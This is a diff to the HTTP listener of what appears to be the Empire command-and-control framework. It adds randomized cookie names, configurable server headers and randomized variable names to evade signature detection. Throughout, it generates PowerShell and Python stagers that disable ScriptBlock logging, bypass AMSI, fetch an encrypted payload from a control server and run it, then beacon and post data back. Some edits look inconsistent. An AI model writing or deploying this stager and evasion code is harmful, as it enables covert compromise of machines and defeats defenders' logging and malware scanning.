@@ -2,6 +2,7 @@ import logging
 import base64
 import sys
 import random
+import string
 import os
 import ssl
 import time
@@ -106,11 +107,16 @@ class Listener:
                 'Required'      :   False,
                 'Value'         :   ''
             },
-            'ServerVersion' : {
-                'Description'   :   'Server header for the control server.',
+            'Headers' : {
+                'Description'   :   'Headers for the control server.',
                 'Required'      :   True,
-                'Value'         :   'Microsoft-IIS/7.5'
+                'Value'         :   'Server:Microsoft-IIS/7.5'
             },
+            'Cookie' : {
+                'Description'   :   'Custom Cookie Name',
+                'Required'      :   False,
+                'Value'         :   ''
+            },            
             'StagerURI' : {
                 'Description'   :   'URI for the stager. Must use /download/. Example: /download/stager.php',
                 'Required'      :   False,
@@ -156,6 +162,12 @@ class Listener:
 
         # randomize the length of the default_response and index_page headers to evade signature based scans
         self.header_offset = random.randint(0, 64)
+
+        self.session_cookie = ''
+
+        # check if the current session cookie not empty and then generate random cookie
+        if self.session_cookie == '':
+            self.options['Cookie']['Value'] = self.generate_cookie()
 
     def default_response(self):
         """
@@ -270,6 +282,14 @@ class Listener:
             stage0 = random.choice(uris)
             customHeaders = profile.split('|')[2:]
 
+            cookie = listenerOptions['Cookie']['Value']
+
+            # generate new cookie if the current session cookie is empty to avoid empty cookie if create multiple listeners
+            if cookie == '':
+                generate = self.generate_cookie()
+                listenerOptions['Cookie']['Value'] = generate
+                cookie = generate
+
             if language.startswith('po'):
                 # PowerShell
 
@@ -278,21 +298,21 @@ class Listener:
                     stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
 
                     # ScriptBlock Logging bypass
-                    stager += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
+                    stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPF")+"=[ref].Assembly.GetType(")
                     stager += "'System.Management.Automation.Utils'"
                     stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
                     stager += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(");If($GPF){$GPC=$GPF.GetValue($null);If($GPC")
+                    stager += helpers.randomize_capitalization(");If($"+helpers.generate_random_script_var_name("GPF")+"){$"+helpers.generate_random_script_var_name("GPC")+"=$"+helpers.generate_random_script_var_name("GPF")+".GetValue($null);If($"+helpers.generate_random_script_var_name("GPC")+"")
                     stager += "['ScriptB'+'lockLogging']"
-                    stager += helpers.randomize_capitalization("){$GPC")
+                    stager += helpers.randomize_capitalization("){$"+helpers.generate_random_script_var_name("GPC")+"")
                     stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
-                    stager += helpers.randomize_capitalization("$GPC")
+                    stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPC")+"")
                     stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
                     stager += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
                     stager += "('EnableScriptB'+'lockLogging',0);"
                     stager += helpers.randomize_capitalization("$val.Add")
                     stager += "('EnableScriptBlockInvocationLogging',0);"
-                    stager += helpers.randomize_capitalization("$GPC")
+                    stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPC")+"")
                     stager += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
                     stager += helpers.randomize_capitalization("=$val}")
                     stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
@@ -300,15 +320,15 @@ class Listener:
                     stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
 
                     # @mattifestation's AMSI bypass
-                    stager += helpers.randomize_capitalization("[Ref].Assembly.GetType(")
+                    stager += helpers.randomize_capitalization("$Ref=[Ref].Assembly.GetType(")
                     stager += "'System.Management.Automation.AmsiUtils'"
-                    stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
+                    stager += helpers.randomize_capitalization(');$Ref.GetField(')
                     stager += "'amsiInitFailed','NonPublic,Static'"
-                    stager += helpers.randomize_capitalization(").SetValue($null,$true)};")
+                    stager += helpers.randomize_capitalization(").SetValue($null,$true);")
                     stager += "};"
                     stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
 
-                stager += helpers.randomize_capitalization("$wc=New-Object System.Net.WebClient;")
+                stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+"=New-Object System.Net.WebClient;")
 
                 if userAgent.lower() == 'default':
                     profile = listenerOptions['DefaultProfile']['Value']
@@ -323,34 +343,37 @@ class Listener:
                     stager += helpers.randomize_capitalization('$wc.Headers.Add(')
                     stager += "'User-Agent',$u);"
 
-                if proxy.lower() != 'none':
-                    if proxy.lower() == 'default':
-                        stager += helpers.randomize_capitalization("$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
-                    else:
-                        # TODO: implement form for other proxy
-                        stager += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy('")
-                        stager += proxy.lower()
-                        stager += helpers.randomize_capitalization("');")
-                        stager += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
-                    if proxyCreds.lower() != 'none':
-                        if proxyCreds.lower() == "default":
-                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
+                    if userAgent.lower() != 'none':
+                        stager += helpers.randomize_capitalization('$'+helpers.generate_random_script_var_name("wc")+'.Headers.Add(')
+                        stager += "'User-Agent',$u);"
+
+                    if proxy.lower() != 'none':
+                        if proxy.lower() == 'default':
+                            stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
                         else:
-                            # TODO: implement form for other proxy credentials
-                            username = proxyCreds.split(':')[0]
-                            password = proxyCreds.split(':')[1]
-                            if len(username.split('\\')) > 1:
-                                usr = username.split('\\')[1]
-                                domain = username.split('\\')[0]
-                                stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
+                            # TODO: implement form for other proxy
+                            stager += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy('")
+                            stager += proxy.lower()
+                            stager += helpers.randomize_capitalization("');")
+                            stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Proxy = $proxy;")
+                        if proxyCreds.lower() != 'none':
+                            if proxyCreds.lower() == "default":
+                                stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                             else:
-                                usr = username.split('\\')[0]
-                                stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"');"
-                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")
-                else:
-                    stager += helpers.randomize_capitalization("$wc.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();")
-                    #save the proxy settings to use during the entire staging process and the agent
-                stager += "$Script:Proxy = $wc.Proxy;"
+                                # TODO: implement form for other proxy credentials
+                                username = proxyCreds.split(':')[0]
+                                password = proxyCreds.split(':')[1]
+                                if len(username.split('\\')) > 1:
+                                    usr = username.split('\\')[1]
+                                    domain = username.split('\\')[0]
+                                    stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
+                                else:
+                                    usr = username.split('\\')[0]
+                                    stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"');"
+                                stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Proxy.Credentials = $netcred;")
+
+                        #save the proxy settings to use during the entire staging process and the agent
+                        stager += "$Script:Proxy = $"+helpers.generate_random_script_var_name("wc")+".Proxy;"
 
                 # TODO: reimplement stager retries?
                 #check if we're using IPv6
@@ -384,18 +407,16 @@ class Listener:
                         #If host header defined, assume domain fronting is in use and add a call to the base URL first
                         #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
                         if headerKey.lower() == "host":
-                            stager += helpers.randomize_capitalization("try{$ig=$WC.DownloadData($ser)}catch{};")
-
-                        stager += helpers.randomize_capitalization("$wc.Headers.Add(")
+                            stager += helpers.randomize_capitalization("try{$ig=$"+helpers.generate_random_script_var_name("wc")+".DownloadData($ser)}catch{};")
+ 
+                        stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Headers.Add(")
                         stager += "\"%s\",\"%s\");" % (headerKey, headerValue)
 
                 # add the RC4 packet to a cookie
-
-                stager += helpers.randomize_capitalization("$wc.Headers.Add(")
-                stager += "\"Cookie\",\"session=%s\");" % (b64RoutingPacket)
-
-
-                stager += helpers.randomize_capitalization("$data=$WC.DownloadData($ser+$t);")
+                stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Headers.Add(")
+                stager += "\"Cookie\",\"%s=%s\");" % (cookie, b64RoutingPacket)
+                
+                stager += helpers.randomize_capitalization("$data=$"+helpers.generate_random_script_var_name("wc")+".DownloadData($ser+$t);")
                 stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")
 
                 # decode everything and kick it over to IEX to kick off execution
@@ -446,7 +467,7 @@ class Listener:
                 launcherBase += "req=urllib2.Request(server+t);\n"
                 # add the RC4 packet to a cookie
                 launcherBase += "req.add_header('User-Agent',UA);\n"
-                launcherBase += "req.add_header('Cookie',\"session=%s\");\n" % (b64RoutingPacket)
+                launcherBase += "req.add_header('Cookie',\"%s=%s\");\n" % (cookie,b64RoutingPacket)
 
                 # Add custom headers if any
                 if customHeaders != []:
@@ -550,8 +571,15 @@ class Listener:
                 host += "/"
 
             #Patch in custom Headers
+            remove = []
             if customHeaders != []:
-                headers = ','.join(customHeaders)
+                for key in customHeaders:
+                    value = key.split(":")
+                    if 'cookie' in value[0].lower() and value[1]:
+                        continue
+                    remove += value    
+                headers = ','.join(remove)
+                #headers = ','.join(customHeaders)
                 stager = stager.replace("$customHeaders = \"\";","$customHeaders = \""+headers+"\";")
 
             #patch in working hours, if any
@@ -730,22 +758,22 @@ class Listener:
                                 $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
 
                                 # build the web request object
-                                $wc = New-Object System.Net.WebClient
+                                $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
 
                                 # set the proxy settings for the WC to be the default system settings
-                                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-                                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                                 if($Script:Proxy) {
-                                    $wc.Proxy = $Script:Proxy;
+                                    $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
                                 }
 
-                                $wc.Headers.Add("User-Agent",$script:UserAgent)
-                                $script:Headers.GetEnumerator() | % {$wc.Headers.Add($_.Name, $_.Value)}
-                                $wc.Headers.Add("Cookie", "session=$RoutingCookie")
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$script:UserAgent)
+                                $script:Headers.GetEnumerator() | % {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("Cookie",\"""" + self.session_cookie + """=$RoutingCookie")
 
                                 # choose a random valid URI for checkin
                                 $taskURI = $script:TaskURIs | Get-Random
-                                $result = $wc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
+                                $result = $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
                                 $result
                             }
                         }
@@ -773,21 +801,21 @@ class Listener:
 
                             if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
                                 # build the web request object
-                                $wc = New-Object System.Net.WebClient
+                                $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
                                 # set the proxy settings for the WC to be the default system settings
-                                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-                                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                                 if($Script:Proxy) {
-                                    $wc.Proxy = $Script:Proxy;
+                                    $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
                                 }
 
-                                $wc.Headers.Add('User-Agent', $Script:UserAgent)
-                                $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('User-Agent', $Script:UserAgent)
+                                $Script:Headers.GetEnumerator() | ForEach-Object {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
 
                                 try {
                                     # get a random posting URI
                                     $taskURI = $Script:TaskURIs | Get-Random
-                                    $response = $wc.UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
+                                    $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
                                 }
                                 catch [System.Net.WebException]{
                                     # exception posting data...
@@ -833,7 +861,7 @@ def send_message(packets=None):
         #   meta TASKING_REQUEST = 4
         routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
         b64routingPacket = base64.b64encode(routingPacket)
-        headers['Cookie'] = "session=%s" % (b64routingPacket)
+        headers['Cookie'] = \"""" + self.session_cookie + """=%s" % (b64routingPacket)
 
     taskURI = random.sample(taskURIs, 1)[0]
     requestUri = server + taskURI
@@ -921,8 +949,11 @@ def send_message(packets=None):
 
         @app.after_request
         def change_header(response):
-            "Modify the default server version in the response."
-            response.headers['Server'] = listenerOptions['ServerVersion']['Value']
+            "Modify the headers response server."
+            headers = listenerOptions['Headers']['Value']
+            for key in headers.split("|"):
+               value = key.split(":")
+               response.headers[value[0]] = value[1]
             return response
 
 
@@ -974,11 +1005,12 @@ def send_message(packets=None):
 
             routingPacket = None
             cookie = request.headers.get('Cookie')
+
             if cookie and cookie != '':
                 try:
                     # see if we can extract the 'routing packet' from the specified cookie location
                     # NOTE: this can be easily moved to a paramter, another cookie value, etc.
-                    if 'session' in cookie:
+                    if self.session_cookie in cookie:
                         listenerName = self.options['Name']['Value']
                         message = "[*] GET cookie value from {} : {}".format(clientIP, cookie)
                         signal = json.dumps({
@@ -988,7 +1020,7 @@ def send_message(packets=None):
                         dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
                         cookieParts = cookie.split(';')
                         for part in cookieParts:
-                            if part.startswith('session'):
+                            if part.startswith(self.session_cookie):
                                 base64RoutingPacket = part[part.find('=')+1:]
                                 # decode the routing packet base64 value in the cookie
                                 routingPacket = base64.b64decode(base64RoutingPacket)
@@ -1204,3 +1236,14 @@ def send_message(packets=None):
         else:
             print helpers.color("[!] Killing listener '%s'" % (self.options['Name']['Value']))
             self.threads[self.options['Name']['Value']].kill()
+
+
+    def generate_cookie(self):
+        """
+        Generate Cookie
+        """
+
+        chars = string.letters
+        cookie = helpers.random_string(random.randint(6,16), charset=chars)
+
+        return cookie            
